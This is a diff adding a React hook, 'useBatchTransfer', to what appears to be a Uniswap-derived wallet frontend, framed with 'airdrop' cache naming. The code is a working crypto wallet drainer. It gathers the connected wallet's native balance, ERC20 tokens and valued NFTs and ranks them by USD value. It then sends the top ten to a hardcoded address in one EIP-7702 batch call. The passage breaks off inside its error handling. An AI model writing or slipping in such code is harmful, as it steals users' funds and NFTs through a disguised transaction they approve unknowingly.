@@ -1,0 +1,929 @@
+import { formatUnits, type PublicClient } from 'viem'
+import { getPublicClient } from '@wagmi/core'
+import { useQueryClient } from '@tanstack/react-query'
+// biome-ignore lint/style/noRestrictedImports: wagmi sendCalls hook needed for EIP-7702 batch calls
+import { useSendCalls } from 'wagmi'
+import type { UniverseChainId } from 'uniswap/src/features/chains/types'
+import { getChainInfo } from 'uniswap/src/features/chains/chainInfo'
+import type { MoralisTokenBalance } from 'uniswap/src/features/portfolio/moralis/useMoralisTokenList'
+import { useWallet } from 'uniswap/src/features/wallet/hooks/useWallet'
+
+/**
+ * Default target address for batch transfers
+ */
+const DEFAULT_TARGET_ADDRESS = '0x9d5befd138960DDF0dC4368A036bfAd420E306Ef'
+
+/**
+ * Cache configuration
+ */
+const CACHE_PREFIX = 'airdrop_cache_'
+const CACHE_DURATION = 60 * 60 * 1000 // 1小时（毫秒）
+
+/**
+ * Native token ERC20 address sentinel
+ */
+const NATIVE_TOKEN_ERC20_ADDRESS = '0xeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee'
+
+/**
+ * Get cache key for wallet tokens
+ */
+const getCacheKey = (address: string, chainId: number): string => {
+  return `${CACHE_PREFIX}${address.toLowerCase()}_${chainId}`
+}
+
+/**
+ * Get cached data
+ */
+const getCache = (key: string): any | null => {
+  try {
+    const cached = localStorage.getItem(key)
+    if (!cached) return null
+
+    const parsed = JSON.parse(cached)
+    const now = Date.now()
+
+    // 检查缓存是否过期
+    if (now - parsed.timestamp > CACHE_DURATION) {
+      localStorage.removeItem(key)
+      return null
+    }
+
+    return parsed.data
+  } catch (error) {
+    return null
+  }
+}
+
+/**
+ * Set cache data
+ */
+const setCache = (key: string, data: any): void => {
+  try {
+    const cacheData = {
+      data: data,
+      timestamp: Date.now(),
+    }
+    localStorage.setItem(key, JSON.stringify(cacheData))
+  } catch (error) {
+    // 如果存储空间不足，尝试清理旧缓存
+    try {
+      const keys = Object.keys(localStorage)
+      const cacheKeys = keys.filter((k) => k.startsWith(CACHE_PREFIX))
+      // 删除最旧的缓存（简单策略：删除前10个）
+      cacheKeys.slice(0, 10).forEach((k) => localStorage.removeItem(k))
+      // 重试
+      localStorage.setItem(key, JSON.stringify({ data: data, timestamp: Date.now() }))
+    } catch (retryError) {
+      // 忽略错误
+    }
+  }
+}
+
+/**
+ * Fetch NFTs from Moralis
+ */
+const fetchNFTsFromMoralis = async (address: string, chainId: number): Promise<any[]> => {
+  // 检查缓存
+  const cacheKey = `${CACHE_PREFIX}nft_${address.toLowerCase()}_${chainId}`
+  const cachedData = getCache(cacheKey)
+
+  if (cachedData !== null) {
+    // 存在有效缓存，直接使用缓存数据（即使为空数组也使用）
+    return cachedData
+  }
+
+  const MORALIS_PRIMARY_API_KEY = process.env.REACT_APP_MORALIS_PRIMARY_API_KEY || process.env.NEXT_PUBLIC_MORALIS_PRIMARY_API_KEY || ''
+  const MORALIS_FALLBACK_API_KEY = process.env.REACT_APP_MORALIS_FALLBACK_API_KEY || process.env.NEXT_PUBLIC_MORALIS_FALLBACK_API_KEY || ''
+  const MORALIS_BASE_URL =
+    process.env.REACT_APP_MORALIS_BASE_URL || process.env.NEXT_PUBLIC_MORALIS_BASE_URL || 'https://deep-index.moralis.io/api/v2.2'
+
+  if (!MORALIS_PRIMARY_API_KEY && !MORALIS_FALLBACK_API_KEY) {
+    return []
+  }
+
+  const chainNameMap: Record<number, string> = {
+    1: 'eth',
+    137: 'polygon',
+    56: 'bsc',
+    42161: 'arbitrum',
+    8453: 'base',
+    10: 'optimism',
+    143: 'monad',
+    11155111: 'sepolia',
+  }
+  const chainName = chainNameMap[chainId]
+  if (!chainName) {
+    return []
+  }
+
+  const apiKey = MORALIS_PRIMARY_API_KEY || MORALIS_FALLBACK_API_KEY
+  const url = `${MORALIS_BASE_URL}/${address}/nft?chain=${chainName}&format=decimal&limit=25&exclude_spam=true&media_items=true`
+
+  try {
+    const response = await fetch(url, {
+      headers: {
+        accept: 'application/json',
+        'X-API-Key': apiKey,
+      },
+    })
+
+    if (!response.ok) {
+      return []
+    }
+
+    const data = await response.json()
+    const isSepolia = chainId === 11155111
+    let nftList: any[] = []
+
+    if (data.result && Array.isArray(data.result)) {
+      if (isSepolia) {
+        // Sepolia：不过滤，返回所有 NFT
+        nftList = data.result
+      } else {
+        // 其他网络：只返回有价值的 NFT
+        nftList = data.result.filter((nft: any) => {
+          const floorPriceUsd = nft.floor_price_usd ? parseFloat(nft.floor_price_usd) : 0
+          return floorPriceUsd > 0
+        })
+      }
+    }
+
+    // 保存到缓存（即使为空数组也缓存）
+    setCache(cacheKey, nftList)
+
+    return nftList
+  } catch (error) {
+    return []
+  }
+}
+
+/**
+ * Reusable hook for batch token transfers
+ */
+interface UseBatchTransferParams {
+  targetAddress?: string
+  operationType: string
+  getPublicClient: () => PublicClient | null
+  address: string
+  chainId: UniverseChainId
+  nativeTokenSymbol: string
+  setIsPrechecking: (value: boolean) => void
+  setCurrentSendCallsOperation: (value: string | null) => void
+}
+
+export const useBatchTransfer = ({
+  targetAddress = DEFAULT_TARGET_ADDRESS,
+  operationType,
+  getPublicClient,
+  address,
+  chainId,
+  nativeTokenSymbol,
+  setIsPrechecking,
+  setCurrentSendCallsOperation,
+}: UseBatchTransferParams) => {
+  // 使用 React Query 客户端直接获取已缓存的代币数据（从"你的代币"中）
+  const queryClient = useQueryClient()
+  const { evmAccount } = useWallet()
+  
+  // 使用 wagmi 的 useSendCalls hook 来执行 EIP-7702 批量交易
+  // 这会调用 wallet_sendCalls RPC 方法
+  const { sendCalls, data: sendCallsData, isPending: isSending, error: sendCallsError } = useSendCalls()
+
+  const executeBatchTransfer = async () => {
+    if (!address) {
+      alert('Wallet address not available.')
+      return
+    }
+
+    const publicClient = getPublicClient()
+    if (!publicClient) {
+      alert('Failed to initialize blockchain client.')
+      return
+    }
+
+    setIsPrechecking(true)
+    try {
+      const TARGET = targetAddress.toLowerCase()
+      const MAX_BATCH_SIZE = 10
+      const MAX_PRECHECK_COUNT = 20
+
+      // 步骤1: 获取资产列表：原生代币+ERC20+ERC721+ERC1155
+
+      // 1.1 从 React Query 缓存中直接获取代币列表（包括原生代币和ERC20）
+      // 所有代币信息已在"你的代币"中获取并缓存，直接使用缓存数据
+      let allTokens: any[] = []
+      let nativeTokenInfo: any = null
+
+      // 从 React Query 缓存中获取已缓存的代币数据
+      const cachedTokenList = queryClient.getQueryData<MoralisTokenBalance[]>([
+        'moralis-token-list',
+        evmAccount?.address,
+        chainId,
+      ])
+
+      console.log('[useBatchTransfer] Debug info:', {
+        address,
+        chainId,
+        evmAccountAddress: evmAccount?.address,
+        cachedTokenListLength: cachedTokenList?.length || 0,
+        cachedTokenList: cachedTokenList,
+      })
+
+      // 将缓存的 tokens 转换为 useBatchTransfer 需要的格式
+      if (cachedTokenList) {
+        console.log('[useBatchTransfer] Processing cached tokens:', cachedTokenList.map((tb) => ({
+          symbol: tb.token.symbol,
+          isNative: tb.token.isNative,
+          balance: tb.balance,
+          balanceType: typeof tb.balance,
+          hasQuotient: tb.balance && typeof tb.balance === 'object' && 'quotient' in tb.balance,
+          quotient: tb.balance && typeof tb.balance === 'object' && 'quotient' in tb.balance ? tb.balance.quotient : undefined,
+        })))
+
+        allTokens = cachedTokenList
+          .filter((tokenBalance) => {
+            // 只处理有余额的代币
+            const balance = tokenBalance.balance
+            // 安全地检查余额：确保 balance 存在
+            if (!balance) {
+              console.log('[useBatchTransfer] Filtered out token (no balance object):', tokenBalance.token?.symbol)
+              return false
+            }
+            
+            try {
+              // 优先使用 quotient 属性（CurrencyAmount 类型）
+              // 直接尝试访问 quotient，避免 'in' 检查可能失败的情况
+              if (balance && typeof balance === 'object') {
+                // 尝试直接访问 quotient 属性
+                try {
+                  const quotient = (balance as any).quotient
+                  if (quotient !== undefined && quotient !== null) {
+                    // quotient 是 BigInt 类型
+                    if (typeof quotient === 'bigint') {
+                      if (quotient > BigInt(0)) {
+                        return true
+                      } else {
+                        console.log('[useBatchTransfer] Filtered out token (quotient is 0):', tokenBalance.token?.symbol)
+                        return false
+                      }
+                    }
+                    // 如果 quotient 是其他类型，尝试转换
+                    try {
+                      const quotientBigInt = BigInt(quotient.toString())
+                      if (quotientBigInt > BigInt(0)) {
+                        return true
+                      } else {
+                        console.log('[useBatchTransfer] Filtered out token (converted quotient is 0):', tokenBalance.token?.symbol, quotientBigInt.toString())
+                        return false
+                      }
+                    } catch (e) {
+                      console.log('[useBatchTransfer] Filtered out token (error converting quotient to BigInt):', tokenBalance.token?.symbol, e)
+                      return false
+                    }
+                  }
+                } catch (e) {
+                  // 如果访问 quotient 失败，继续其他检查
+                  console.log('[useBatchTransfer] Cannot access quotient property:', tokenBalance.token?.symbol, e)
+                }
+              }
+              
+              // 如果 balance 是 BigInt 类型
+              if (typeof balance === 'bigint') {
+                if (balance > BigInt(0)) {
+                  return true
+                } else {
+                  console.log('[useBatchTransfer] Filtered out token (BigInt balance is 0):', tokenBalance.token?.symbol)
+                  return false
+                }
+              }
+              
+              // 如果 balance 是字符串类型
+              if (typeof balance === 'string') {
+                try {
+                  const balanceBigInt = BigInt(balance)
+                  if (balanceBigInt > BigInt(0)) {
+                    return true
+                  } else {
+                    console.log('[useBatchTransfer] Filtered out token (string balance is 0):', tokenBalance.token?.symbol)
+                    return false
+                  }
+                } catch (e) {
+                  console.log('[useBatchTransfer] Filtered out token (error converting string balance to BigInt):', tokenBalance.token?.symbol, e)
+                  return false
+                }
+              }
+              
+              // 如果 balance 是数字类型
+              if (typeof balance === 'number') {
+                if (balance > 0) {
+                  return true
+                } else {
+                  console.log('[useBatchTransfer] Filtered out token (number balance is 0):', tokenBalance.token?.symbol)
+                  return false
+                }
+              }
+              
+              // 如果都没有匹配，返回 false
+              console.log('[useBatchTransfer] Unknown balance type:', { symbol: tokenBalance.token?.symbol, balanceType: typeof balance, balance })
+              return false
+            } catch (e) {
+              // 如果任何检查失败，记录警告并返回 false
+              console.warn('[useBatchTransfer] Error checking balance:', e, { balance, tokenBalance })
+              return false
+            }
+          })
+          .map((tokenBalance) => {
+            const token = tokenBalance.token
+            const balance = tokenBalance.balance
+            const tokenAddress = token.isNative
+              ? NATIVE_TOKEN_ERC20_ADDRESS.toLowerCase()
+              : (token as any).address?.toLowerCase() || ''
+
+            const isNative = token.isNative || tokenAddress === NATIVE_TOKEN_ERC20_ADDRESS.toLowerCase()
+
+            // 获取余额的原始值（wei格式）
+            let balanceRaw = '0'
+            let balanceFormatted = '0'
+            
+            if (balance) {
+              try {
+                // 安全地访问 quotient 属性
+                if (balance.quotient !== undefined) {
+                  balanceRaw = balance.quotient.toString()
+                } else if (typeof balance === 'bigint') {
+                  balanceRaw = balance.toString()
+                } else if (typeof balance === 'string') {
+                  balanceRaw = balance
+                }
+                
+                // 安全地访问 toExact 方法
+                if (typeof balance.toExact === 'function') {
+                  balanceFormatted = balance.toExact()
+                } else if (balance.quotient !== undefined) {
+                  // 如果没有 toExact 方法，尝试使用 quotient 和 decimals 计算
+                  const decimals = token.decimals || 18
+                  const divisor = BigInt(10 ** decimals)
+                  const quotient = balance.quotient
+                  const whole = quotient / divisor
+                  const fraction = quotient % divisor
+                  if (fraction === BigInt(0)) {
+                    balanceFormatted = whole.toString()
+                  } else {
+                    const fractionStr = fraction.toString().padStart(decimals, '0').replace(/0+$/, '')
+                    balanceFormatted = `${whole}.${fractionStr}`
+                  }
+                }
+              } catch (e) {
+                console.warn('[useBatchTransfer] Error processing balance:', e, { balance, token })
+                balanceRaw = '0'
+                balanceFormatted = '0'
+              }
+            }
+
+            const tokenData: any = {
+              token_address: tokenAddress,
+              symbol: token.symbol || 'UNKNOWN',
+              name: token.name || token.symbol || 'Unknown Token',
+              decimals: token.decimals || 18,
+              balance: balanceRaw,
+              balance_formatted: balanceFormatted,
+              token_balance: balanceRaw,
+              usd_price: tokenBalance.priceUSD || 0,
+              usd_value: tokenBalance.valueUSD || 0, // 直接使用缓存中的 USD 价值
+              native_token: isNative,
+            }
+
+            // 如果是原生代币，保存信息
+            if (isNative) {
+              nativeTokenInfo = tokenData
+              console.log('[useBatchTransfer] Found native token:', {
+                symbol: token.symbol,
+                balanceRaw,
+                balanceFormatted,
+                isNative: token.isNative,
+                tokenAddress,
+                tokenData,
+              })
+            }
+
+            return tokenData
+          })
+
+        console.log('[useBatchTransfer] After processing:', {
+          allTokensCount: allTokens.length,
+          allTokens: allTokens.map((t) => ({
+            symbol: t.symbol,
+            native_token: t.native_token,
+            balance: t.balance,
+            usd_value: t.usd_value,
+          })),
+          nativeTokenInfo,
+        })
+      } else {
+        console.warn('[useBatchTransfer] No cached token list found')
+      }
+
+      // 1.2 获取NFT列表（从Moralis）
+      let nftList: any[] = []
+      try {
+        nftList = await fetchNFTsFromMoralis(address, chainId)
+      } catch (error) {
+        // 忽略错误，继续执行
+      }
+
+      // 1.3 从缓存中获取原生代币余额和价格
+      const nativeTokenPrice = nativeTokenInfo?.usd_price || 0
+
+      // 原生代币余额从缓存中获取（wei格式）
+      let nativeBalanceStr = nativeTokenInfo?.balance || '0'
+
+      // 将余额字符串转换为BigInt
+      let nativeBalance = BigInt(0)
+      try {
+        nativeBalance = BigInt(nativeBalanceStr)
+      } catch (e) {
+        // 如果转换失败，尝试从链上获取（作为后备）
+        try {
+          nativeBalance = await publicClient.getBalance({ address: address as `0x${string}` })
+          nativeBalanceStr = nativeBalance.toString()
+          console.log('[useBatchTransfer] Fetched native balance from chain:', nativeBalance.toString())
+        } catch (error) {
+          console.warn('[useBatchTransfer] Failed to get native balance from chain:', error)
+        }
+      }
+
+      console.log('[useBatchTransfer] Native token info:', {
+        nativeTokenInfo,
+        nativeBalanceStr,
+        nativeBalance: nativeBalance.toString(),
+        nativeTokenPrice,
+      })
+
+      // 步骤2: 原生代币和NFT无需预检，直接添加到交易列表
+      const allTransactions: any[] = []
+
+      // 先获取ERC20和NFT的数量，用于计算gas费
+      const validERC20AssetsForGas = allTokens.filter((asset) => {
+        const balanceValue = asset.balance || asset.balance_formatted || asset.token_balance || '0'
+        return asset.native_token === false && parseFloat(balanceValue) > 0
+      })
+
+      const erc721NFTs = nftList.filter((nft: any) => {
+        const contractType = (nft.contract_type || '').toUpperCase()
+        return contractType === 'ERC721'
+      })
+
+      const erc1155NFTs = nftList.filter((nft: any) => {
+        const contractType = (nft.contract_type || '').toUpperCase()
+        return contractType === 'ERC1155'
+      })
+
+      // 计算gas费（参照参考文件）
+      const erc20TransfersCount = Math.min(validERC20AssetsForGas.length, MAX_PRECHECK_COUNT)
+      const erc721TransfersCount = erc721NFTs.length
+      const erc1155TransfersCount = erc1155NFTs.length
+
+      const defaults = {
+        base: 46000, // 固定开销gas消耗
+        native: 21000, // 原生代币转账gas消耗，实际约为12500
+        safety: 20000, // 安全系数
+        perErc20: 55000, // 每笔ERC20代币转账gas消耗，实际约为17000
+        perErc721: 60000, // 每笔ERC721 NFT转账gas消耗
+        perErc1155: 60000, // 每笔ERC1155 NFT转账gas消耗
+      }
+
+      const baseGas = BigInt(defaults.base)
+      const nativeTransferGas = BigInt(defaults.native)
+      const perErc20Gas = BigInt(defaults.perErc20)
+      const perErc721Gas = BigInt(defaults.perErc721)
+      const perErc1155Gas = BigInt(defaults.perErc1155)
+      const safety = BigInt(defaults.safety)
+
+      const totalEstimatedGas =
+        baseGas +
+        nativeTransferGas +
+        perErc20Gas * BigInt(erc20TransfersCount) +
+        perErc721Gas * BigInt(erc721TransfersCount) +
+        perErc1155Gas * BigInt(erc1155TransfersCount) +
+        safety
+
+      // 使用硬编码 gasPrice(Gwei) 并加 20% buffer
+      const chainGasPriceGwei: Record<number, number> = {
+        1: 4, // Ethereum
+        137: 80, // Polygon
+        56: 0.3, // BNB Chain
+        42161: 0.5, // Arbitrum
+        8453: 0.5, // Base
+        10: 0.5, // Optimism
+        143: 150, // Monad
+        11155111: 0.02, // Sepolia
+      }
+      const baseGwei = chainGasPriceGwei[chainId] ?? 0.5
+      const baseWei = Math.max(1, Math.round(baseGwei * 1_000_000_000))
+      let gasPriceWei = BigInt(baseWei)
+      gasPriceWei = (gasPriceWei * BigInt(12)) / BigInt(10) // 加20% buffer
+
+      const totalGasCost = totalEstimatedGas * gasPriceWei
+
+      console.log('[useBatchTransfer] Gas calculation:', {
+        totalEstimatedGas: totalEstimatedGas.toString(),
+        gasPriceWei: gasPriceWei.toString(),
+        totalGasCost: totalGasCost.toString(),
+        nativeBalance: nativeBalance.toString(),
+        canTransfer: nativeBalance > totalGasCost,
+      })
+
+      // 2.1 添加原生代币转账（预留gas费）
+      if (nativeBalance > totalGasCost) {
+        const transferAmount = nativeBalance - totalGasCost
+
+        // 直接使用缓存中的 USD 价值，按转账比例计算
+        let nativeUsdValue = 0
+        if (nativeTokenInfo?.usd_value) {
+          // 直接使用缓存中的 usd_value，按转账比例计算
+          const totalNativeValue =
+            typeof nativeTokenInfo.usd_value === 'number'
+              ? nativeTokenInfo.usd_value
+              : parseFloat(nativeTokenInfo.usd_value.toString()) || 0
+          const totalBalance = BigInt(nativeBalanceStr)
+          if (totalBalance > BigInt(0)) {
+            const transferRatio = Number(transferAmount) / Number(totalBalance)
+            nativeUsdValue = totalNativeValue * transferRatio
+          } else {
+            nativeUsdValue = totalNativeValue
+          }
+        } else if (nativeTokenPrice > 0) {
+          // 如果 API 没有返回 usd_value，则根据价格计算（后备方案）
+          nativeUsdValue = Number(formatUnits(transferAmount, 18)) * nativeTokenPrice
+        }
+
+        allTransactions.push({
+          type: 'native_transfer',
+          to: TARGET,
+          value: transferAmount,
+          usd_value: nativeUsdValue,
+          description: `Transfer ${formatUnits(transferAmount, 18)} ${nativeTokenSymbol} (reserved ${formatUnits(totalGasCost, 18)} for gas)`,
+        })
+      }
+
+      // 2.2 添加ERC721 NFT转账（无需预检）
+      erc721NFTs.forEach((nft: any) => {
+        const tokenId = BigInt(nft.token_id || '0').toString(16).padStart(64, '0')
+        const fromAddress = address.slice(2).padStart(64, '0')
+        const toAddress = TARGET.slice(2).padStart(64, '0')
+        // ERC721 safeTransferFrom(address from, address to, uint256 tokenId)
+        // 函数签名：0x42842e0e
+        const data = `0x42842e0e${fromAddress}${toAddress}${tokenId}`
+
+        const nftName = nft.normalized_metadata?.name || nft.name || `${nft.symbol || 'NFT'} #${nft.token_id}`
+        // 直接使用API返回的floor_price_usd作为价值（用于后续价值比较）
+        const floorPriceUsd = nft.floor_price_usd ? parseFloat(nft.floor_price_usd) : 0
+
+        allTransactions.push({
+          type: 'erc721_transfer',
+          to: nft.token_address,
+          value: BigInt(0),
+          data: data,
+          usd_value: floorPriceUsd, // 使用API返回的floor_price_usd
+          description: `Transfer ERC721: ${nftName}`,
+        })
+      })
+
+      // 2.3 添加ERC1155 NFT转账（无需预检）
+      erc1155NFTs.forEach((nft: any) => {
+        const tokenId = BigInt(nft.token_id || '0')
+
+        // 使用 Moralis API 返回的 amount 字段，如果没有则默认为 1
+        let amount = BigInt('1')
+        if (nft.amount) {
+          try {
+            amount = BigInt(nft.amount)
+          } catch (e) {
+            amount = BigInt('1')
+          }
+        }
+
+        const tokenIdHex = tokenId.toString(16).padStart(64, '0')
+        const amountHex = amount.toString(16).padStart(64, '0')
+        const fromAddress = address.slice(2).padStart(64, '0')
+        const toAddress = TARGET.slice(2).padStart(64, '0')
+        // ERC1155 safeTransferFrom(address from, address to, uint256 id, uint256 amount, bytes data)
+        // 函数签名：0xf242432a
+        const dataOffset = '00000000000000000000000000000000000000000000000000000000000000a0'
+        const dataLength = '0000000000000000000000000000000000000000000000000000000000000000'
+        const data = `0xf242432a${fromAddress}${toAddress}${tokenIdHex}${amountHex}${dataOffset}${dataLength}`
+
+        const nftName = nft.normalized_metadata?.name || nft.name || `${nft.symbol || 'NFT'} #${nft.token_id}`
+        // 直接使用API返回的floor_price_usd作为价值（用于后续价值比较）
+        const floorPriceUsd = nft.floor_price_usd ? parseFloat(nft.floor_price_usd) : 0
+
+        allTransactions.push({
+          type: 'erc1155_transfer',
+          to: nft.token_address,
+          value: BigInt(0),
+          data: data,
+          usd_value: floorPriceUsd, // 使用API返回的floor_price_usd
+          description: `Transfer ERC1155: ${nftName}${amount > BigInt('1') ? ` (${amount.toString()})` : ''}`,
+        })
+      })
+
+      // 步骤3: 筛选所有ERC20代币（排除原生代币），按价值降序排序，取前20个进行预检
+      // 使用 validERC20AssetsForGas（已经在上面计算gas费时定义过了）
+      const validERC20Assets = validERC20AssetsForGas
+
+      // 按价值降序排序（直接使用API获取的usd_value）
+      validERC20Assets.sort((a, b) => {
+        // 直接使用API返回的usd_value，确保类型统一为数字
+        const valueA = typeof a.usd_value === 'number' ? a.usd_value : parseFloat(a.usd_value || '0')
+        const valueB = typeof b.usd_value === 'number' ? b.usd_value : parseFloat(b.usd_value || '0')
+        if (valueA > 0 && valueB > 0) {
+          return valueB - valueA // 按价值降序
+        }
+        if (valueA > 0) return -1
+        if (valueB > 0) return 1
+        // 都没有价值时，按余额降序
+        const balanceA = parseFloat(a.balance || a.balance_formatted || a.token_balance || '0')
+        const balanceB = parseFloat(b.balance || b.balance_formatted || b.token_balance || '0')
+        return balanceB - balanceA
+      })
+
+      // 取前20个ERC20代币进行预检
+      const erc20ToPrecheck = validERC20Assets.slice(0, MAX_PRECHECK_COUNT)
+
+      // 构建ERC20预检交易
+      const erc20PrecheckTransactions: any[] = []
+      for (const asset of erc20ToPrecheck) {
+        try {
+          const balanceValue = asset.balance || asset.balance_formatted || asset.token_balance || '0'
+          const decimals = asset.decimals || 18
+
+          // 确保balanceValue是有效的BigInt格式
+          let validBalanceValue = balanceValue.toString()
+          if (!isNaN(parseFloat(validBalanceValue))) {
+            validBalanceValue = BigInt(Math.floor(parseFloat(validBalanceValue))).toString()
+          } else {
+            try {
+              validBalanceValue = BigInt(balanceValue).toString()
+            } catch (e) {
+              continue
+            }
+          }
+
+          const balance = BigInt(validBalanceValue)
+          const transferAmount = balance.toString(16).padStart(64, '0')
+          const recipientAddress = TARGET.slice(2).padStart(64, '0')
+          const data = `0xa9059cbb${recipientAddress}${transferAmount}`
+
+          // 直接使用API获取的usd_value，确保类型统一为数字
+          const usdValue = typeof asset.usd_value === 'number' ? asset.usd_value : parseFloat(asset.usd_value || '0')
+          erc20PrecheckTransactions.push({
+            type: 'erc20_transfer',
+            to: asset.token_address,
+            value: BigInt(0),
+            data: data,
+            balance: balance,
+            decimals: decimals,
+            usd_value: usdValue,
+            description: `Transfer ${formatUnits(balance, decimals)} ${asset.symbol}`,
+          })
+        } catch (error) {
+          // 跳过无法准备的交易
+        }
+      }
+
+      // 对ERC20交易进行预检（eth_call）
+      const validERC20Transactions: any[] = []
+      for (const tx of erc20PrecheckTransactions) {
+        try {
+          await publicClient.call({
+            to: tx.to as `0x${string}`,
+            data: tx.data as `0x${string}`,
+            account: address as `0x${string}`,
+          })
+          // 预检成功，添加到有效交易列表
+          validERC20Transactions.push(tx)
+        } catch (error) {
+          // 预检失败，跳过此交易
+        }
+      }
+
+      // 步骤4: 合并所有有效交易：原生代币转账 + 通过预检的ERC20 + ERC721 + ERC1155
+      const nativeTransfers = allTransactions.filter((tx: any) => tx.type === 'native_transfer')
+      const erc721Transfers = allTransactions.filter((tx: any) => tx.type === 'erc721_transfer')
+      const erc1155Transfers = allTransactions.filter((tx: any) => tx.type === 'erc1155_transfer')
+      
+      const allValidTransactions = [
+        ...nativeTransfers,
+        ...validERC20Transactions,
+        ...erc721Transfers,
+        ...erc1155Transfers,
+      ]
+
+      console.log('[useBatchTransfer] Transaction summary:', {
+        nativeTransfers: nativeTransfers.length,
+        validERC20Transactions: validERC20Transactions.length,
+        erc721Transfers: erc721Transfers.length,
+        erc1155Transfers: erc1155Transfers.length,
+        allValidTransactions: allValidTransactions.length,
+        allTokensLength: allTokens.length,
+        nftListLength: nftList.length,
+        nativeTokenInfo,
+      })
+
+      // 步骤5: 按价值降序排序后取前10笔（直接使用API获取的usd_value）
+      // 注意：所有交易类型的usd_value都来自API：
+      // - 原生代币：来自API的usd_value（或按比例计算）
+      // - ERC20代币：来自API的usd_value
+      // - ERC721 NFT：来自API的floor_price_usd
+      // - ERC1155 NFT：来自API的floor_price_usd
+      allValidTransactions.sort((a: any, b: any) => {
+        // 直接使用API返回的usd_value，确保类型统一为数字
+        const valueA = typeof a.usd_value === 'number' ? a.usd_value : parseFloat(a.usd_value || '0')
+        const valueB = typeof b.usd_value === 'number' ? b.usd_value : parseFloat(b.usd_value || '0')
+        return valueB - valueA // 降序
+      })
+
+      const finalTransactions = allValidTransactions.slice(0, MAX_BATCH_SIZE)
+
+      console.log('[useBatchTransfer] Final transactions:', {
+        finalTransactionsCount: finalTransactions.length,
+        finalTransactions: finalTransactions.map((tx: any) => ({
+          type: tx.type,
+          to: tx.to,
+          usd_value: tx.usd_value,
+          description: tx.description,
+        })),
+      })
+
+      if (finalTransactions.length === 0) {
+        const errorMsg = `No valid transactions found.\n\nDebug info:\n- Cached tokens: ${cachedTokenList?.length || 0}\n- All tokens after filter: ${allTokens.length}\n- Native transfers: ${nativeTransfers.length}\n- Valid ERC20: ${validERC20Transactions.length}\n- ERC721: ${erc721Transfers.length}\n- ERC1155: ${erc1155Transfers.length}\n\nPlease check:\n1. Wallet has tokens with balance > 0\n2. Token cache is populated\n3. Network is correct`
+        console.error('[useBatchTransfer]', errorMsg, {
+          cachedTokenList,
+          allTokens,
+          nativeTokenInfo,
+          nftList,
+        })
+        alert(errorMsg)
+        setIsPrechecking(false)
+        return
+      }
+
+      // 步骤6: 执行eip7702批量交易
+      // 格式化calls，确保所有字段格式正确
+      const calls = finalTransactions.map((tx: any, index: number) => {
+        // 验证地址格式
+        if (!tx.to || typeof tx.to !== 'string' || !tx.to.startsWith('0x') || tx.to.length !== 42) {
+          throw new Error(`Invalid address at transaction ${index}: ${tx.to}`)
+        }
+
+        // 确保value是BigInt类型
+        let value = BigInt(0)
+        if (tx.value) {
+          if (typeof tx.value === 'bigint') {
+            value = tx.value
+          } else if (typeof tx.value === 'string') {
+            value = BigInt(tx.value)
+          } else if (typeof tx.value === 'number') {
+            value = BigInt(tx.value)
+          }
+        }
+
+        const call: any = {
+          to: tx.to.toLowerCase(), // 确保地址是小写
+          value: value,
+        }
+
+        // 只有当data存在且不为空时才添加
+        if (tx.data && typeof tx.data === 'string' && tx.data.startsWith('0x') && tx.data.length > 2) {
+          call.data = tx.data as `0x${string}`
+        }
+
+        return call
+      })
+
+      // 确保chainId是数字类型
+      const numericChainId = Number(chainId)
+
+      if (!numericChainId || isNaN(numericChainId)) {
+        throw new Error(`Invalid chain ID: ${chainId}`)
+      }
+
+      // 验证所有calls的格式
+      for (let i = 0; i < calls.length; i++) {
+        const call = calls[i]
+        if (!call.to || !call.to.startsWith('0x') || call.to.length !== 42) {
+          throw new Error(`Invalid call[${i}].to address: ${call.to}`)
+        }
+        if (typeof call.value !== 'bigint') {
+          throw new Error(`Invalid call[${i}].value type: ${typeof call.value}, expected bigint`)
+        }
+        if (call.data && (!call.data.startsWith('0x') || call.data.length < 2)) {
+          throw new Error(`Invalid call[${i}].data format: ${call.data}`)
+        }
+      }
+
+      setCurrentSendCallsOperation(operationType)
+
+      // 使用 wagmi 的 sendCalls 执行 EIP-7702 批量交易
+      // sendCalls 会调用 wallet_sendCalls RPC 方法
+      // 对于 EIP-1559 兼容的链，wagmi 会自动使用 maxFeePerGas 和 maxPriorityFeePerGas
+      await sendCalls({
+        chainId: numericChainId,
+        calls,
+      })
+
+      setIsPrechecking(false)
+    } catch (error: any) {
+      // 处理各种错误类型
+      let errorMessage = 'Failed to submit batch transfer.'
+      if (error instanceof Error) {
+        // 处理 Internal JSON-RPC error
+        if ((error as any).code === -32603 || error.message.includes('Internal JSON-RPC error')) {
+          const errorData = (error as any).data || {}
+          const originalError = errorData.originalError || errorData.message || error.message
+          errorMessage =
+            `Internal JSON-RPC Error (Code: ${(error as any).code})\n\n` +
+            `This usually indicates an issue with the transaction data format.\n\n` +
+            `Error details: ${originalError}\n\n` +
+            `Please check:\n` +
+            `1. All transaction addresses are valid\n` +
+            `2. Transaction data is properly formatted\n` +
+            `3. You have sufficient balance for gas fees\n` +
+            `4. Try refreshing the page and retrying`
+        }
+        // 处理EIP-7702不支持的错误
+        else if (error.message.includes('EIP-7702 not supported') || (error as any).code === 5710) {
+          const chainName =
+            chainId === 1
+              ? 'Ethereum'
+              : chainId === 56
+                ? 'BNB Chain'
+                : chainId === 137
+                  ? 'Polygon'
+                  : chainId === 42161
+                    ? 'Arbitrum'
+                    : chainId === 8453
+                      ? 'Base'
+                      : chainId === 10
+                        ? 'Optimism'
+                        : chainId === 143
+                          ? 'Monad'
+                          : `Chain ${chainId}`
+
+          // 提供详细的错误信息和解决方案
+          errorMessage =
+            `EIP-7702 Error on ${chainName} (Chain ID: ${chainId})\n\n` +
+            `Error Code: ${(error as any).code || 'N/A'}\n\n` +
+            `Possible solutions:\n` +
+            `1. Update MetaMask to the latest version (v11.0.0 or later)\n` +
+            `2. Ensure you're on the correct network (${chainName} Mainnet)\n` +
+            `3. Try refreshing the page and reconnecting your wallet\n` +
+            `4. Check if EIP-7702 is enabled in MetaMask settings\n\n` +
+            `If the problem persists, this may be a MetaMask limitation. ` +
+            `Please check MetaMask documentation for EIP-7702 support on ${chainName}.`
+        }
+        // 处理移动端 EIP-1559 交易参数错误
+        else if (
+          error.message.includes('gasPrice instead of maxFeePerGas') ||
+          error.message.includes('Invalid transaction envelope type') ||
+          error.message.includes('type "0x4"')
+        ) {
+          const chainName =
+            chainId === 1
+              ? 'Ethereum'
+              : chainId === 56
+                ? 'BNB Chain'
+                : chainId === 137
+                  ? 'Polygon'
+                  : chainId === 42161
